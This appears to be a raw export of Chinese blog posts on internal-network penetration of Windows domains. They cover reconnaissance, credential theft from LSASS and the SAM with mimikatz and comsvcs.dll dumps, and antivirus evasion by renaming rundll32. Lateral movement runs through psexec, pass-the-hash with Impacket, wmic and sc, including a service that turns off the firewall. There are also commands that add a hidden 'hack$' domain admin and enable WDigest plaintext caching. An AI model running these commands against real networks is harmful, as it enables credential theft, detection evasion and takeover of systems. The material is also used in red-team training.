name,Version&quot;          #查看安装软件版本</span><br><span class="line"></span><br><span class="line">tasklist       # 默认显示映像名称，PID，会话名，会话，内存使用</span><br><span class="line">tasklist &#x2F;svc  # 显示PID，服务  </span><br><span class="line">（查看是否有杀软 https:&#x2F;&#x2F;www.ddosi.com&#x2F;av&#x2F;1.php）</span><br><span class="line"></span><br><span class="line">netstat -nao               #查看端口</span><br><span class="line">netstat -an | find “3389”  #查看对应端口</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I|findstr “TTL&#x3D;”</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>ipconfig /all</p>
<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621092728.png" alt="image-20210621092721554" style="zoom:150%;">



<p>net  user</p>
<p>net localgroup administrators </p>
<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621095850.png" alt="20210621095850" style="zoom:150%;">

<p>wmic product get name,version </p>
<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621100332.png" alt="20210621100332">

<p>powershell “Get-WmiObject -class Win32_Product | Select-Object -Property name,Version” </p>
<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621100357.png" alt="20210621100357">



<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621101825.png" alt="20210621101825"></p>
<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621112046.png" alt="20210621112046" style="zoom:150%;">



<h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>windows</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;l %i in (1,1,255) do @ping -w 2 -n 1 192.168.119.%i | findstr “TTL&#x3D;”</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220325145246713.png" alt="image-20220325145246713"></p>
<p>linux</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in 10.0.1.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;&#x2F;dev&#x2F;null; then echo $i Find the target; fi; done</span><br></pre></td></tr></table></figure>



<h4 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qusery process 显示活动的后台进程信息</span><br><span class="line"></span><br><span class="line">query Session   查询建立的session连接</span><br><span class="line"></span><br><span class="line">query user  显示有关登录到系统的所有用户的信息</span><br></pre></td></tr></table></figure>



<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220326143716341.png" alt="image-20220326143716341"></p>
<h4 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h4><p>powershell下</p>
<p>查询曾经登陆ip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; -Name</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220524231049415.png" alt="image-20220524231049415"></p>
<p>查询对应用户名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(Get-ItemProperty -Path &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\150.xxx.xxx.xxx&quot;).UsernameHint</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220524231221703.png" alt="image-20220524231221703"></p>
<p><a href="https://cloud.tencent.com/developer/article/1861370">内网渗透｜获取远程桌面连接记录与RDP凭据 - 云+社区 - 腾讯云 (tencent.com)</a></p>
<h2 id="域的信息收集"><a href="#域的信息收集" class="headerlink" title="域的信息收集"></a>域的信息收集</h2><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain           #查询域用户 (通过samr，利用的RPC接口)</span><br><span class="line">net view                   #查看域信息</span><br><span class="line">net view &#x2F;domain           #查看主域信息</span><br><span class="line">net accounts &#x2F;domain       #获取与密码信息(策略)</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain                            #查询域内组</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain       #查看域控</span><br><span class="line">net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员</span><br><span class="line">net group &quot;enterpriser admins&quot;   &#x2F;domain     #查看企业管理用户</span><br><span class="line">net config workstation      #主机名，主机版本，工作站域，工作站域dns-name,当前登录域</span><br><span class="line"></span><br><span class="line">nslookup god.org            #可以定位域控 </span><br><span class="line">https:&#x2F;&#x2F;www.secpulse.com&#x2F;archives&#x2F;32859.html</span><br><span class="line"></span><br><span class="line">net share                   #查看本地共享资源</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621103820.png" alt="20210621103820"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621104756.png" alt="20210621104756"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621104813.png" alt="20210621104813"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621104834.png" alt="20210621104834"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621105024.png" alt="20210621105024"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621111006.png" alt="20210621111006"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621112521.png" alt="20210621112521"></p>
<h4 id="查询域内的SPN。"><a href="#查询域内的SPN。" class="headerlink" title="查询域内的SPN。"></a>查询域内的SPN。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前域内所有的SPN：setspn  -Q  *&#x2F;*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看指定域xie.com注册的SPN：setspn -T xxxxx.god -Q *&#x2F;*      如果指定域不存在，则默认切换到查找本域的SPN</span><br><span class="line"></span><br><span class="line">setspn -L username</span><br><span class="line">setspn -L hostname   查询用户  或者主机名注册的spn</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175201822.png" alt="image-20220303175201822"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175812371.png" alt="image-20220303175812371"></p>
<h4 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nltest &#x2F;domain_trusts   获取域信任信息 </span><br><span class="line">nltest &#x2F;domain_trusts &#x2F;all_trusts &#x2F;v &#x2F;server:192.168.100.236 返回所有信任192.168.100.236域的所有域</span><br><span class="line">nltest &#x2F;dsgetdc:shmily.god 返回信任域相关信息</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220414000904861.png" alt="image-20220414000904861"></p>
<h4 id="域用户所登录的计算机"><a href="#域用户所登录的计算机" class="headerlink" title="域用户所登录的计算机"></a>域用户所登录的计算机</h4><ol>
<li>powershell方式</li>
</ol>
<p><a href="https://www.cnblogs.com/victor0/p/13522618.html">https://www.cnblogs.com/victor0/p/13522618.html</a></p>
<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="Adfind-exe-Softpedia-Free-Downloads-Encyclopedia"><a href="#Adfind-exe-Softpedia-Free-Downloads-Encyclopedia" class="headerlink" title="Adfind.exe  (Softpedia - Free Downloads Encyclopedia)"></a>Adfind.exe  (<a href="https://www.softpedia.com/">Softpedia - Free Downloads Encyclopedia</a>)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询域内所有用户：</span><br><span class="line">AdFind -users name</span><br><span class="line"></span><br><span class="line">查询当前域中所有计算机(只显示名称和操作系统)：</span><br><span class="line">AdFind -f &quot;objectcategory&#x3D;computer&quot; name operatingSystem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询当前域中所有计算机：</span><br><span class="line">AdFind -f &quot;objectcategory&#x3D;computer&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">域控制器名称：</span><br><span class="line">AdFind -sc dclist</span><br></pre></td></tr></table></figure>





<p>LG.exe                                                      </p>
<p>参考：</p>
<p><a href="https://www.t00ls.net/articles-39285.html">内网渗透命令大全</a></p>
<p><a href="https://jwt1399.top/posts/25535.html#toc-heading-14">Attck1</a></p>
<p><a href="https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw">内网渗透学习导航</a></p>
<p><a href="https://mp.weixin.qq.com/s/l6AajnxFp8GMIYqVcN4SGg">参考1</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user hack$ 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack$ &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>内网抓hash/密码</title>
    <url>/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在winserver2012以后，windows保存的不是明文密码，只会保持密码的hash值</p>
<p>本地用户hash保存在SAM数据库中，域内用户密码hash保存在NTDS.dit文件中</p>
<p>常见格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure>



<p>AAD3B435B51404EEAAD3B435B51404EE是<code>LM hash</code>   这个是之前认证使用的，现在已经不使用了</p>
<p>31D6CFE0D16AE931B73C59D7E0C089C0是<code>NTLM hash</code></p>
<p>在<code>域环境</code>中，机器认证是利用kerberos协议，在内网渗透中，域环境中拿到普通域用户/域管 hash，可以尝试pth。</p>
<p>在<code>工作组</code>环境中如果两台机器如果本地administrator账号密码一样也可能可以pth。</p>
 <a id="more"></a>

<p> 域环境中如果两台机器如果本地administrator账号密码一样也可能可以pth，所以这就体现<code>LAPS</code>方案重要性。</p>
<p>LAPS：Local Administrator Password Solution是<strong>本地管理员密码</strong>解决方案</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装</span><br><span class="line">powershell Get-ADComputer computername -Properties ms-Mcs-AdmPwd | select name, ms-Mcs-AdmPwd</span><br><span class="line"></span><br><span class="line">如果安装可在软件列表中发现 Local Administrator Password Solution</span><br></pre></td></tr></table></figure>

<p>LAPS允许您在<code>加入域</code>的情况下管理<code>本地管理员密码</code>（<code>随机</code>，唯一且定期更改）电脑。如果计算机未加入域，则将无法使用LAPS。这些密码集中存储在Active Directory中，并且仅限使用ACL的授权用户使用。使用Kerberos v5和AES从客户端到服务器的传输密码受到保护。</p>
<p>这个功能实现的是让加域的客户端本地administrator账号密码随机化（每一台都不一样的复杂随机密码），并且随机化密码存储在AD上可以查询到，避免***者猜出一台就等于猜出一片，从客户端到服务器的传输过程采用Kerberos v5和AES保护</p>
<h1 id="LSASS"><a href="#LSASS" class="headerlink" title="LSASS"></a>LSASS</h1><p>lsass进程内存中存储大量敏感信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">encrypted passwords</span><br><span class="line">NT hashes</span><br><span class="line">LM hashes</span><br><span class="line">Kerberos tickets</span><br></pre></td></tr></table></figure>

<p>通过LSASS转储来进行权限提升，数据窃取和横向移动等。</p>
<h1 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1. mimikatz"></a>1. mimikatz</h1><p>需要<code>管理员权限</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt </span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325161740275.png" alt="image-20220325161740275"></p>
<p>可分为两步：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug             提升权限</span><br><span class="line">sekurlsa::logonpasswords     抓密码</span><br></pre></td></tr></table></figure>



<h1 id="2-各种dump-mimikatz"><a href="#2-各种dump-mimikatz" class="headerlink" title="2. 各种dump+mimikatz"></a>2. 各种dump+mimikatz</h1><h3 id="procdump"><a href="#procdump" class="headerlink" title="procdump"></a>procdump</h3><p>(官方软件)</p>
<p>有杀软的情况procdump不会被杀，但产生的lsass.dmp会可能被清除 （wdf下面会），我感觉应该在wdf白名单路径下进行转储</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp   #然后将lsass.dmp下载到本地</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">procdump64.exe -accepteula -ma [lsass.exe的PID] lsass.dmp</span><br><span class="line">(mimikatz.exe &quot;sekurlsa::minidump dump path &quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325150155475.png" alt="image-20220325150155475"></p>
<h3 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h3><p>有这个就 够了</p>
<p>(Windows自带C:\WINDOWS\System32\rundll32.exe)     原理是通过<code>API MiniDumpWriteDump</code>，利用<code>comsvcs.dll</code>导出 函数 minidump 进行dump内存</p>
<p>条件：<code>开启SeDebugPrivilege权限</code> （管理员cmd下改权限 一般情况是Disabled状态，powershell下默认开启）</p>
<p> powershell/cmd下运行comsvcs.dll 的MiniDump 来dump</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\lsass.dmp full</span><br></pre></td></tr></table></figure>

<p>但要绕过AMSI</p>
<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325172436533-16484821151331.png" alt="image-20220325172436533"></p>
<h5 id="如何绕过杀软"><a href="#如何绕过杀软" class="headerlink" title="如何绕过杀软"></a>如何绕过杀软</h5><p>cmd下  执行火绒，360，wdf  都报毒，并且还可能没有权限</p>
<p>powershell下  火绒不报， 360报， wdf 的amsi直接拦截</p>
<h5 id="绕360和wdf"><a href="#绕360和wdf" class="headerlink" title="绕360和wdf"></a>绕360和wdf</h5><p>参考下面文章，但是2022.3.30这种方法不能绕了，，<br>(<a href="https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag">https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag</a>)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy C:\windows\System32\comsvcs.dll bypass360.dll</span><br><span class="line"></span><br><span class="line">rundll32.exe bypass360.dll, MiniDump pid lsass.dmp full    </span><br></pre></td></tr></table></figure>



<p>2022.3.30后来我又想到了，copy  rundll32.exe  命名为1.exe ，直接就绕过了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd  C:\WINDOWS\System32</span><br><span class="line"></span><br><span class="line">copy C:\windows\System32\comsvcs.dll bypass360.dll</span><br><span class="line">copy C:\WINDOWS\System32\rundll32.exe 1.exe</span><br><span class="line"></span><br><span class="line">1.exe bypass360.dll, MiniDump pid lsass.dmp full</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330172101684.png" alt="image-20220330172101684"></p>
<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330172955506.png" alt="image-20220330172955506"></p>
<ul>
<li>方法肯定很多，这个要分析杀软是怎么进行检测，然后进行对抗绕过。 呜呜呜真的不会其他的</li>
</ul>
<h3 id="AvDump"><a href="#AvDump" class="headerlink" title="AvDump"></a>AvDump</h3><p>我没有搞成功。。。。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0</span><br></pre></td></tr></table></figure>



<h3 id="SqlDumper"><a href="#SqlDumper" class="headerlink" title="SqlDumper"></a>SqlDumper</h3><p>在sqlserver安装路径为：\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe</p>
<p>单独安装需要MSVRC100.dll  （[<a href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=26999)%EF%BC%89">https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=26999)）</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sqldumper.exe &lt;ProcessID&gt; 0 0x01100    完整转储</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330155608001.png" alt="image-20220330155608001"></p>
<h3 id="DumpMinitool-exe"><a href="#DumpMinitool-exe" class="headerlink" title="DumpMinitool.exe"></a>DumpMinitool.exe</h3><ul>
<li>过360，wdf  ，自带微软签名，需要vs2022自带的</li>
</ul>
<p>参考：<a href="https://twitter.com/mrd0x/status/1511415432888131586/photo/1">https://twitter.com/mrd0x/status/1511415432888131586/photo/1</a></p>
<p>有写winserver不带这个程序，这点比较限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C：\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions</span><br></pre></td></tr></table></figure>

<p>DumpMinitool.exe   </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DumpMinitool.exe   --file  c:\dump.txt  --proccessId xxxx --dumpType Full</span><br></pre></td></tr></table></figure>





<h1 id="3-Out-MiniDump"><a href="#3-Out-MiniDump" class="headerlink" title="3. Out-MiniDump"></a>3. Out-MiniDump</h1><p>Out-MiniDump.ps1 wdf直接杀，环境win10下Import-Module 不能执行，可能win server能用吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module Out-MiniDump  </span><br><span class="line"></span><br><span class="line">Get-Process lsass | Out-Minidump   </span><br></pre></td></tr></table></figure>

<p>没有成功就不截图了</p>
<h1 id="4-导出本地SAM-mimikatz"><a href="#4-导出本地SAM-mimikatz" class="headerlink" title="4. 导出本地SAM+mimikatz"></a>4. 导出本地SAM+mimikatz</h1><p>导出本地sam数据库数据，（这个只能获得所有<code>本地用户</code>hash）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM </span><br></pre></td></tr></table></figure>

<p>mimikatz读取即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM exit&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325171109114.png" alt="image-20220325171109114"></p>
<p>方法还有更多，杀软也多种多样，慢慢学习吧</p>
<p>参考：</p>
<p>一些获取Windows明文凭据的方法 | Loong716]：<a href="https://loong716.top/posts/lsass/">https://loong716.top/posts/lsass/</a></p>
<p><a href="https://redcanary.com/threat-detection-report/techniques/lsass-memory/">LSASS 内存 - 威胁检测报告 - 红色金丝雀 (redcanary.com)</a></p>
<h1 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h1><ol>
<li>winserver2012以后只能抓到用户hash，抓不到明文，但可以通过修改注册表**<code>开启Wdigest Auth</code>**，</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>

<p>然后cmd执行<code>强制锁屏</code>（rundll32 user32.dll,LockWorkStation），等待管理员重新登陆在抓。</p>
<ol start="2">
<li>hashcat 爆破ntlm hash，有可能拿到明文。</li>
<li>md5解密ntml hash 比较简单的可以解出</li>
<li>一些工具要做对应的免杀测试吧。</li>
</ol>
<p>记录下几篇文章：</p>
<p>利用脚本工具进行无文件LSASS dump凭据转储</p>
<p><a href="https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/">https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/</a></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网抓hash/密码</tag>
      </tags>
  </entry>
  <entry>
    <title>内网横向渗透</title>
    <url>/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>不断更新</p>
<p>配合impacket工具使用</p>
<h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h1><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，是为了让进程间通信而开放的命名管道</p>
<p>利用条件：</p>
<ol>
<li>开放139,445端口</li>
<li></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share   显示所有共享资源</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &quot;密码&quot; &#x2F;user:&quot;用户名&quot; 建立ipc非空连接</span><br><span class="line"></span><br><span class="line">net use h: \\ip\c$     将对方c 映射到本地h</span><br><span class="line"></span><br><span class="line">net use \\ip\c$ &#x2F;del   如果断开连接就删除重新连接就行</span><br></pre></td></tr></table></figure>



<a id="more"></a>



<h3 id="psexec-ipc"><a href="#psexec-ipc" class="headerlink" title="psexec+ipc$"></a>psexec+ipc$</h3><p>前提是与目标主机建立ipc连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.3.100\ipc$   建立ipc共享</span><br><span class="line"></span><br><span class="line">PsExec64.exe -accepteula \\&lt;目标机IP&gt; -s cmd.exe   #获得交互式shell，并且权限提升到system权限</span><br><span class="line"></span><br><span class="line">-accepteula: 第一次运行PsExec会弹出确认框，使用该参数就不会出现</span><br><span class="line">-s: 以system权限运行远程进程，获得一个system权限的交互式shell,不使用此参数获得一个 administrator的shell</span><br></pre></td></tr></table></figure>



<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><p>windows 2008 以下 at</p>
<h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><p>windows 2008 及以上 schtasks</p>
<h3 id="Atexec"><a href="#Atexec" class="headerlink" title="Atexec"></a>Atexec</h3><ul>
<li>Impacket套件中的Atexec.py  能通过windows计划任务执行远程命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 atexec.py -hashes :3c3ec769143bdd0ed99861d0fb79fc6b</span><br><span class="line">shmily.god&#x2F;Administrator@192.168.119.100 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">python3 atexec.py .&#x2F;administrator:admin123...@192.168.119.100 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>









<h3 id="ipc-sc"><a href="#ipc-sc" class="headerlink" title="ipc+sc"></a>ipc+sc</h3><p>sc主要用来对操作系统服务进行管理</p>
<p>建立ipc后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\ip  create servername binpath&#x3D; &quot;c:\door.exe&quot; start&#x3D;auto</span><br><span class="line"></span><br><span class="line">启动</span><br><span class="line"></span><br><span class="line">sc \ip start servername</span><br></pre></td></tr></table></figure>

<p>​        </p>
<p>sc通过服务关防火墙 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\ip create unablefirewall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line"></span><br><span class="line">sc \\ip start unablefirewall</span><br></pre></td></tr></table></figure>



<h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><p>前言：</p>
<p>WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；用户可以使用 WMI 管理本地和远程计算机。</p>
<p>平时可以用wmic查看进程/安装程序</p>
<ul>
<li>开放135，没有开防火墙</li>
</ul>
<p>利用：</p>
<p>ipc+wmic：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	wmic &#x2F;node:IP &#x2F;user:admin &#x2F;password:123456 process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\result.txt&quot;</span><br><span class="line"></span><br><span class="line">	wmic &#x2F;node:192.168.xxx.xxx &#x2F;user:admin &#x2F;password:123456 process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\result.txt&quot;</span><br><span class="line"></span><br><span class="line">type \\192.168.xxx.xxx\c$\result.txt</span><br></pre></td></tr></table></figure>



<p>wmic+hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">impacket中的wmiexec.py使用：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code> python wmiexec.py 用户名:密码@目标IP                                  #获得交互式shell

python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP           #hash传递

python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP &quot;ipconfig&quot; </code></pre>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">还有vbs，powershell方式</span><br><span class="line"></span><br><span class="line"># WinRm服务</span><br><span class="line"></span><br><span class="line">前言：</span><br><span class="line"></span><br><span class="line">Windows 远程管理(WinRM)是 WS-Management 协议的 Microsoft 实现，该协议为使用 Web 服务的本地计算机和远程计算机之间的通信提供了一种安全的方式。</span><br><span class="line"></span><br><span class="line">WinRM 默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证，初始身份验证后，WinRM 会话将使用 AES 加密保护。使用 WinRM 服务需要拥有管理员级别的权限。</span><br><span class="line"></span><br><span class="line"> WinRM HTTP 通过 TCP 端口 5985 进行通信，启动 WinRM 服务后，防火墙默认会自动放行 5985 端口。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用：</span><br><span class="line"></span><br><span class="line">winrs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>winrs -r:<a href="http://ip:5985/">http://ip:5985</a> -u:[username] -p:[password] <command></p>
<p>winrs -r:<a href="http://dc1.god.loal:5985/">http://dc1.god.loal:5985</a> -u:[username] -p:[password] <command>   #域中指定远程主机机器名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># dcom</span><br><span class="line"></span><br><span class="line">DCOM（分布式组件对象模型）是微软的一系列概念和程序接口</span><br><span class="line"></span><br><span class="line">Impacket 的dcomexec.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>python dcomexec.py shmily.god/Administrator:<a href="mailto:&#x31;&#50;&#51;&#x34;&#x35;&#x36;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#49;&#49;&#57;&#46;&#49;&#x30;&#48;">&#x31;&#50;&#51;&#x34;&#x35;&#x36;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#49;&#49;&#57;&#46;&#49;&#x30;&#48;</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># PTH</span><br><span class="line"></span><br><span class="line">基于NTML hash认证  (windows认证方式)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PsExec64.exe  无ipc只能用账户密码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
